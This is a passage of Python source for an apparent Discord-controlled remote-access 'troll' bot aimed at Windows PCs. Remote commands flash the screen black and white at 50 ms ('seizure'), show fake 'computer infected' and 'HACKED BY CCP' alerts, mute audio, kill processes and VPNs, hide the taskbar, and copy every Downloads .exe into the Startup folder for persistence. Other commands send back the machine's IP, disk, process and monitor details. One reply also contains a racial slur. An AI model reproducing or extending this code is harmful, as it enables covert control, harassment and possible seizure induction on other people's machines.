                # Set the system volume to zero
                volume.SetMasterVolumeLevelScalar(0.0, None)
                await asyncio.sleep(1.0)

        # Start the set_volume_zero function as a task
        bot.loop.create_task(set_volume_zero())

    except Exception as e:
        print(f"Error starting mutetroll: {e}")

@bot.command()
async def stealcredit(ctx):
    await ctx.send("Bro, really thought that was possible. dumbass nigger")
    
    # Send the Rick Astley GIF link as a message
    await ctx.send("https://media1.tenor.com/images/985bc5cfe28d4b7ccb8a9058efbb693a/tenor.gif?itemid=14097983")

@bot.command()
async def seizure(ctx):
    try:
        # Create a fullscreen GUI window
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.wm_attributes('-topmost', 1)
        root.focus_force()

        # Function to toggle between black and white screens
        def toggle_color():
            if root.cget("bg") == "black":
                root.configure(bg="white")
            else:
                root.configure(bg="black")
            root.after(50, toggle_color)  # Toggle every 0.5 seconds

        # Start toggling the color
        toggle_color()

        # Close the GUI window after 10 seconds
        root.after(10000, root.destroy)

        # Run the GUI event loop
        root.mainloop()

        await ctx.send("Seizure GUI opened!")

    except Exception as e:
        print(f"Error opening Seizure GUI: {e}")

@bot.command()
async def pfp(ctx):
    try:
        # Check if an attachment is present
        if not ctx.message.attachments:
            await ctx.send("Please attach an image to change the profile picture.")
            return

        # Get the first attachment
        attachment = ctx.message.attachments[0]

        # Download the attached file
        await attachment.save("new_pfp.jpg")

        # Change the bot's profile picture
        with open("new_pfp.jpg", "rb") as file:
            await bot.user.edit(avatar=file.read())

        await ctx.send("Profile picture updated!")

    except Exception as e:
        print(f"Error changing profile picture: {e}")
        await ctx.send("Error changing profile picture.")


# Get the current script directory
script_directory = os.path.dirname(os.path.abspath(__file__))

# Define the image filename (assuming r.png is in the same folder)
image_filename = os.path.join(script_directory, "r.png")

# Function to create a spinning illusion
async def create_spinning_illusion():
    angle = 0
    while True:
        image = Image.open(image_filename)
        rotated_image = image.rotate(angle, resample=Image.BICUBIC)

        # Save the rotated image with a unique filename
        rotated_filename = os.path.join(script_directory, f"spinning_wallpaper_{angle}.png")
        rotated_image.save(rotated_filename)

        # Set the desktop background using the platform-specific command
        if os.name == 'nt':  # Windows
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(rotated_filename), 3)
        elif os.name == 'posix':  # Linux
            os.system(f'gsettings set org.gnome.desktop.background picture-uri "file://{os.path.abspath(rotated_filename)}"')

        angle += 10  # Adjust the rotation angle as needed
        await asyncio.sleep(0.1)  # Adjust the sleep duration for smoother animation

# Define the wallpaperspin command
@bot.command(name='wallpaperspin')
async def wallpaperspin(ctx):
    await ctx.send("Spinning desktop background started!")
    asyncio.create_task(create_spinning_illusion())
    asyncio.create_task(create_spinning_illusion())


@bot.command(help="Simulate a mouse click (left or right).")
async def mouseclick(ctx, leftorright: str):
    try:
        # Check if the argument is "left" or "right"
        if leftorright.lower() == "left":
            pyautogui.click(button="left")
            await ctx.send("Left mouse click simulated.")
        elif leftorright.lower() == "right":
            pyautogui.click(button="right")
            await ctx.send("Right mouse click simulated.")
        else:
            await ctx.send("Invalid argument. Use 'left' or 'right'.")

    except Exception as e:
        print(f"Error simulating mouse click: {e}")


@bot.command()
async def storageinfo(ctx):
    try:
        # Get information about the storage devices
        partitions = psutil.disk_partitions()

        storage_info = ""
        for partition in partitions:
            usage = psutil.disk_usage(partition.mountpoint)
            storage_info += f"{partition.device} - Total: {usage.total / (1024 ** 3):.2f} GB, Free: {usage.free / (1024 ** 3):.2f} GB\n"

        await ctx.send(storage_info)

    except Exception as e:
        print(f"Error fetching storage information: {e}")
        await ctx.send("An error occurred while fetching storage information.") 


@bot.command()
async def cursorspeed(ctx, speed: int):
    try:
        # Ensure the speed is within a reasonable range
        speed = max(min(speed, 20), 1)

        # Change cursor speed in Windows registry
        registry_key = "Control Panel\\Mouse"
        ctypes.windll.user32.SystemParametersInfoW(113, 0, speed, 0)
        ctypes.windll.kernel32.WritePrivateProfileStringW(registry_key, "MouseSpeed", str(speed), "User")

        await ctx.send(f"Cursor speed set to {speed}.")

    except Exception as e:
        print(f"Error changing cursor speed: {e}")
        await ctx.send("An error occurred while changing cursor speed.")

@bot.command(name='mousefly')
async def mouse_fly(ctx):
    try:
        pyautogui.moveTo(600, 600)
        pyautogui.click()
        pyautogui.moveTo(600, 800)

        # "Your computer is infected" message
        ctypes.windll.user32.MessageBoxW(0, "Your computer is infected.", "COMPUTER INFECTED", 1)

        for _ in range(1000):
            x, y = random.randint(0, 1920), random.randint(0, 1080)
            pyautogui.moveTo(x, y)
            time.sleep(0.01)

        await ctx.send("Mouse flying completed!")

    except Exception as e:
        print(f"Error during mouse_fly command: {e}")




@bot.command()
async def playsound(ctx):
    global current_audio

    try:
        # Check if an audio file is attached
        if not ctx.message.attachments:
            await ctx.send("Please attach an MP3 file for the hacking experience.")
            return

        # Get the first attachment (assuming it's the MP3 file)
        audio_attachment = ctx.message.attachments[0]

        # Check if the uploaded file is an MP3 file
        if not audio_attachment.filename.lower().endswith('.mp3'):
            await ctx.send("Please attach a valid MP3 file for the hacking experience.")
            return

        # Save the uploaded MP3 file
        audio_path = os.path.join(os.getcwd(), 'hacked_audio.mp3')
        await audio_attachment.save(audio_path)

        # Initialize the mixer if not initialized
        if pygame.mixer.get_init() is None:
            pygame.mixer.init()

        # Set the volume to the maximum (100%)
        pygame.mixer.music.set_volume(1.0)

        # Load and play the audio file on loop
        pygame.mixer.music.load(audio_path)
        pygame.mixer.music.play(-1)  # -1 indicates playing on loop

        # Set an end event to detect when the audio playback ends
        pygame.mixer.music.set_endevent(pygame.USEREVENT + 1)

        # Display Windows alerts saying HACKED BY CCP every 1 second
        while pygame.mixer.music.get_busy():
            ctypes.windll.user32.MessageBoxW(0, "HACKED BY CCP", "Alert", 0.01)
            await asyncio.sleep(1)

        # Update the currently playing audio
        current_audio = audio_path

        # Stop and quit the mixer after the audio has finished playing
        pygame.mixer.music.stop()
        pygame.mixer.quit()

        await ctx.send("You've been hacked! 🕵️‍♂️")

    except Exception as e:
        await ctx.send(f"Error during !hacked command: {e}")


@bot.command(name='res')
async def get_system_info(ctx):
    try:
        # Get screen resolution
        user32 = ctypes.windll.user32
        width = user32.GetSystemMetrics(0)  # Get screen width
        height = user32.GetSystemMetrics(1)  # Get screen height

        # Get monitor information
        monitors = get_monitors()
        monitor_info = []
        for idx, monitor in enumerate(monitors, start=1):
            resolution = f"{monitor.width}x{monitor.height}"
            length_inches = monitor.width / 25.4  # Convert width from mm to inches
            length_cm = monitor.width / 10  # Convert width from mm to cm
            width_inches = monitor.height / 25.4  # Convert height from mm to inches
            width_cm = monitor.height / 10  # Convert height from mm to cm
            brand = monitor.name  # Use the full monitor name as brand

            # Get video outputs information using WMI
            c = wmi.WMI()
            video_outputs = c.Win32_VideoController()
            connections = [output.Caption for output in video_outputs if output.PNPDeviceID == monitor.name]

            # Create a string with HDMI ports highlighted
            connection_info = ''
            for conn in connections:
                if "HDMI" in conn:
                    if ctx.message.author.voice and ctx.message.author.voice.channel.name in conn:
                        connection_info += f'**{conn}** '
                    else:
                        connection_info += f'{conn} '

            monitor_info.append(f"{idx}. Resolution: {resolution}\n   Length: {length_inches:.2f} inches / {length_cm:.2f} cm\n   Width: {width_inches:.2f} inches / {width_cm:.2f} cm\n   Brand: {brand}\n   Connections: {connection_info.strip()}")

        # Create a copyable bubble with code block formatting
        info_message = "```\n" + '\n'.join(monitor_info) + "\n```"
        await ctx.send(info_message)
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

PROCESSES_PER_PAGE = 30

@bot.command(name='lp')
async def list_running_processes(ctx):
    try:
        # Get the list of running processes
        processes = [p.info for p in psutil.process_iter(['pid', 'name'])]

        # Format the process information for display
        process_info = [f"{idx + 1}. {process['name']} (PID: {process['pid']})" for idx, process in enumerate(processes)]

        # Create a copyable bubble with code block formatting
        info_text = "\n".join(process_info)

        # Create a text file in memory
        file_object = io.BytesIO(info_text.encode())

        # Send the text file as an attachment
        await ctx.send(file=discord.File(file_object, filename="running_processes.txt"))

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

from typing import Union


@bot.command(name='kp')
async def kill_process(ctx, process_identifier: str):
    try:
        # Iterate over all running processes
        killed_processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_identifier:
                # Kill the process
                proc.kill()
                killed_processes.append(proc.info['pid'])

        if killed_processes:
            await ctx.send(f"Killed all instances of process '{process_identifier}'.")
        else:
            await ctx.send(f"No process with name '{process_identifier}' found.")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

import re

@bot.command(name='screenspin')
async def flip_screen(ctx, *, arg):
    spin_duration = None
    num_rotations = None

    # Check if the argument contains 't' for rotations
    if 't' in arg:
        match = re.match(r'(\d+)t', arg)
        if match:
            num_rotations = int(match.group(1))
    else:
        # If 't' is not present, assume the argument is for duration
        spin_duration = int(arg)

    if spin_duration is None and num_rotations is None:
        await ctx.send("Please specify either the duration or the number of rotations.")
        return

    if spin_duration:
        await ctx.send(f"Flipping the screen for {spin_duration} seconds...")
    else:
        await ctx.send(f"Flipping the screen {num_rotations} times...")

    pd = rs.get_primary_display()
    angle_list = [90, 180, 270, 0]

    async def stop_flip():
        if spin_duration:
            await asyncio.sleep(spin_duration)
            pd.rotate_to(0)
            await ctx.send(f"Screen flip stopped after {spin_duration} seconds.")
        else:
            await asyncio.sleep(0.5 * num_rotations * len(angle_list))
            pd.rotate_to(0)
            await ctx.send(f"Screen flip completed {num_rotations} rotations.")

    flip_task = asyncio.create_task(stop_flip())

    for _ in range(num_rotations if num_rotations else 5):
        for angle in angle_list:
            pd.rotate_to(angle)
            await asyncio.sleep(0.5)
            if keyboard.is_pressed("p"):
                pd.rotate_to(0)
                await ctx.send("Screen flip canceled.")
                flip_task.cancel()
                return
        if flip_task.done():
            break

    await flip_task

@bot.command(name='upsidedown')
async def upside_down(ctx):
    await ctx.send("Flipping the screen 180 degrees...")

    pd = rs.get_primary_display()
    pd.rotate_to(180)

    await ctx.send("Screen flipped 180 degrees.")


@bot.command(name='restore')
async def restore_screen(ctx):
    await ctx.send("Restoring the screen to normal...")

    pd = rs.get_primary_display()
    pd.rotate_to(0)

    await ctx.send("Screen restored to normal.")





@bot.command(name='startupadd')
async def add_to_startup(ctx):
    try:
        # Get the user's home directory
        user_home = os.path.expanduser("~")

        # Default downloads folder path
        downloads_folder = os.path.join(user_home, "Downloads")

        # Destination folder for creating shortcuts
        startup_folder = os.path.join(user_home, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

        # Check if the downloads folder exists
        if not os.path.isdir(downloads_folder):
            await ctx.send("Downloads folder not found.")
            return

        # Iterate over files in the downloads folder
        for filename in os.listdir(downloads_folder):
            if filename.endswith(".exe"):
                # Full path to the executable file
                exe_path = os.path.join(downloads_folder, filename)

                # Check if the executable file exists
                if os.path.isfile(exe_path):
                    # Copy the executable file to the startup folder
                    shutil.copy(exe_path, startup_folder)
                    await ctx.send(f"Added {filename} to startup.")

        await ctx.send("All .exe files from Downloads folder added to startup.")

    except Exception as e:
        print(f"Error adding files to startup: {e}")
        await ctx.send("Error adding files to startup. Check the console for details.")
        raise  # Re-raise the exception for further debugging


import win32gui
import win32con
@bot.command(name='taskbar')
async def taskbar(ctx, action: str):
    # Convert the action to lowercase for case-insensitive comparison
    action = action.lower()

    # Check if the action is "on" or "off"
    if action == 'on':
        # Show the taskbar
        win32gui.ShowWindow(win32gui.FindWindow("Shell_traywnd", None), win32con.SW_SHOW)
        await ctx.send("Taskbar is now visible.")
    elif action == 'off':
        # Hide the taskbar
        win32gui.ShowWindow(win32gui.FindWindow("Shell_traywnd", None), win32con.SW_HIDE)
        await ctx.send("Taskbar is now hidden.")
    else:
        await ctx.send("Invalid action. Please use `.taskbar on` or `.taskbar off`.")



@bot.command()
async def ip(ctx):
    # Fetch the user's public IP address using ipify.org API
    public_ip = requests.get('https://api64.ipify.org?format=json').json().get('ip', 'N/A')

    # Display information about the public IP address
    embed = discord.Embed(title="Public IP Information", color=0x00ff00)
    embed.add_field(name="Public IP Address", value=public_ip, inline=False)

    await ctx.send(embed=embed)
    
@bot.command(name='vpnn')
async def vpndetect(ctx):
    # List of common VPN process names
    vpn_processes = ["vpn"]

    # Check if any VPN process is running
    running_vpn_processes = [process.name() for process in psutil.process_iter() if any(keyword in process.name().lower() for keyword in vpn_processes)]

    if running_vpn_processes:
        # If VPN process(es) detected, display the process name(s)
        processes_str = "\n".join(running_vpn_processes)
        await ctx.send(f"VPN detected! Running process(es):```\n{processes_str}```")

        # Attempt to terminate the detected VPN processes (for educational purposes only)
        for process_name in running_vpn_processes:
            try:
                process = next(process for process in psutil.process_iter(attrs=['pid', 'name']) if process.info['name'] == process_name)
                await ctx.send(f"Terminating process: {process.info['name']} (PID: {process.info['pid']})")
                psutil.Process(process.info['pid']).terminate()
            except (StopIteration, psutil.NoSuchProcess):
                await ctx.send(f"Failed to terminate process: {process_name}")
    else:
        await ctx.send("No VPN detected.")
import winreg


# Function to change cursor size
def change_cursor_size(size):
    try:
        # Load the user32.dll library
        user32 = ctypes.windll.user32

        # Set the new cursor size
        user32.SystemParametersInfoW(0x0057, 0, size, 0)  # SPI_SETCURSORS
        user32.SystemParametersInfoW(0x0056, 0, size, 0)  # SPI_SETMOUSE

        return True
    except Exception as e:
        print(e)
        return False

# Command to change cursor size
@bot.command()
async def mousesize(ctx, size: int):
    if size <= 0:
        await ctx.send("Cursor size must be greater than 0.")
        return
    
    if change_cursor_size(size):
        await ctx.send(f"Cursor size changed to {size}.")
    else:
        await ctx.send("Failed to change cursor size. Please try again later.")


@bot.command()
async def rearrangetaskbar(ctx):
    await ctx.send("Rearranging taskbar icons...")

    # Define the number of iterations
    num_iterations = 10

    for _ in range(num_iterations):
        # Minimize and then restore all windows
        pyautogui.hotkey('win', 'd')
        pyautogui.hotkey('win', 'd')

        # Wait for a short duration before the next iteration
        await asyncio.sleep(2)

    await ctx.send("Taskbar icons rearranged!")

@bot.command()
async def keyspam(ctx, key: str, num_times: int):
    await ctx.send(f"Simulating pressing '{key}' {num_times} times...")

    # Define the interval between key presses (in seconds)
    interval = 0.01

    # Convert key to lowercase to handle both uppercase and lowercase keys
    key = key.lower()

    # Perform the key press simulation
    for _ in range(num_times):
        pyautogui.press(key)
        await asyncio.sleep(interval)

    await ctx.send(f"Key '{key}' pressed {num_times} times!")

import colorama

@bot.command()
async def matrixmode(ctx):
    await ctx.send("Activating Matrix mode...")

    # Initialize colorama
    colorama.init()

    try:
        # Open a Command Prompt window in full screen mode with green text on black background
        subprocess.Popen(["cmd", "/K", "color 0a"], shell=True)

        # Start Matrix mode
        while True:
            # Generate a random column position and character
            x = random.randint(0, 79)  # 80 columns for Windows console
            char = chr(random.randint(32, 126))

            # Generate a random starting row position
            y = random.randint(0, 24)  # 25 rows for Windows console

            # Loop through rows and print characters
            for _ in range(25 - y):
                print("\033[{};{}H{}".format(y, x, char), end='', flush=True)
                await asyncio.sleep(0.01)  # Adjust speed here

            # Clear the character at the bottom
            print("\033[{};{}H{}".format(24, x, ' '), end='', flush=True)

    except KeyboardInterrupt:
        pass

    finally:
        # Reset colorama settings
        colorama.deinit()

    await ctx.send("Matrix mode deactivated.")


@bot.command()
async def thugshake(ctx, intensity: int = 5):
    duration = 15  # Set duration to 15 seconds
    await ctx.send(f'Initiating Window Shake prank for {duration} seconds!')
    await asyncio.sleep(1)  # Give a brief delay before starting the prank
    await shake_windows(ctx, duration, intensity)

async def shake_windows(ctx, duration, intensity):
    try:
        # Get screen dimensions
        screen_width, screen_height = pyautogui.size()

        # Get initial window positions
        initial_positions = [(win.left, win.top) for win in pyautogui.getAllWindows()]

        # Calculate shake range based on intensity
        shake_range = intensity

        # Start shaking windows
        start_time = time.time()
        while time.time() - start_time < duration:
            # Randomly shake each window
            for win in pyautogui.getAllWindows():
                x_offset = random.randint(-shake_range, shake_range)
                y_offset = random.randint(-shake_range, shake_range)
                new_x = win.left + x_offset
                new_y = win.top + y_offset

                # Ensure the window stays within the screen boundaries
                new_x = max(0, min(new_x, screen_width - win.width))
                new_y = max(0, min(new_y, screen_height - win.height))

                win.moveTo(new_x, new_y)

            # Pause briefly before the next shake
            await asyncio.sleep(0.05)

        # Restore initial window positions
        for win, (x, y) in zip(pyautogui.getAllWindows(), initial_positions):
            win.moveTo(x, y)

        await ctx.send("Window shake prank ended.")
    except KeyboardInterrupt:
        await ctx.send("Window shake prank ended.")
from PIL import Image, ImageTk, ImageSequence


@bot.command()
async def commands(ctx):
    try:
        command_list = sorted([(cmd.name, cmd.help) for cmd in bot.commands])
        formatted_commands = "\n".join([f"**{name}**: {description}" for name, description in command_list])

        await ctx.send(f"List of Commands:\n\n{formatted_commands}")

    except Exception as e:
        print(f"Error getting commands: {e}")

@bot.command()
async def leave(ctx, guild_id: int):
    try:
        # Get the guild object based on the provided guild ID
        guild = bot.get_guild(guild_id)

        if guild:
            # Leave the guild
            await guild.leave()
            await ctx.send(f"Left the server with ID {guild_id}.")
        else:
            await ctx.send("Guild not found. Please provide a valid guild ID.")

    except Exception as e:
        print(f"Error during !leave command: {e}")
        await ctx.send("Error leaving the server.")


def get_cpu_temp():
    system = platform.system()
    if system == "Linux":
        try:
            output = subprocess.check_output(["cat", "/sys/class/thermal/thermal_zone0/temp"]).decode("utf-8").strip()
            temp = int(output) / 1000  # Convert from millidegrees Celsius to degrees Celsius
            return temp
        except Exception as e:
            print(f"Error retrieving CPU temperature on Linux: {e}")
            return None
    elif system == "Windows":
        try:
            output = subprocess.check_output(["wmic", "cpu", "get", "Temperature"]).decode("utf-8").strip()
            temp = int(output.split("\n")[1].strip()) / 10  # Temperature is in tenths of a degree Celsius
            return temp
        except Exception as e:
            print(f"Error retrieving CPU temperature on Windows: {e}")
            return None
    else:
        print("CPU temperature information is not available on this platform.")
        return None

@bot.command()
async def cputemp(ctx):
    try:
        temp = get_cpu_temp()
        if temp is not None:
            cpu_temp_info = f"Current CPU temperature: {temp}°C"
            await ctx.send(cpu_temp_info)
        else:
            await ctx.send("CPU temperature information is not available on this platform.")
    except Exception as e:
        print(f"Error retrieving CPU temperature: {e}")
        await ctx.send("An error occurred while retrieving CPU temperature information.")

async def hold_key(ctx, key, duration):
    try:
        duration = float(duration)  # Convert duration to float
        await ctx.send(f"Holding {key} for {duration} seconds.")
        end_time = time.time() + duration  # Calculate the end time
        while time.time() < end_time:
            pyautogui.keyDown(key)  # Press the key
            await asyncio.sleep(0.01)  # Adjust the delay as needed
            pyautogui.keyUp(key)  # Release the key
        await ctx.send(f"Released {key}.")

    except ValueError:
        await ctx.send("Invalid duration format. Please provide a valid duration in seconds.")

    except Exception as e:
        print(f"Error holding key: {e}")
        await ctx.send("An error occurred while holding the key.")

@bot.command()
async def holdkey(ctx, key, duration):
    try:
        await hold_key(ctx, key, duration)

    except Exception as e:
        print(f"Error holding key: {e}")
        await ctx.send("An error occurred while holding the key.")
# Retrieve the bot token from token.txt
script_dir = os.path.dirname(os.path.abspath(__file__))
token_file_path = os.path.join(script_dir, "token.txt")
if os.path.exists(token_file_path):
    with open(token_file_path, "r") as token_file:
        bot_token = token_file.read().strip()
else:
    print("Token file 'token.txt' not found!")
    exit(1)

if __name__ == "__main__":
    # Run the bot with the provided token
    bot.run(bot_token)
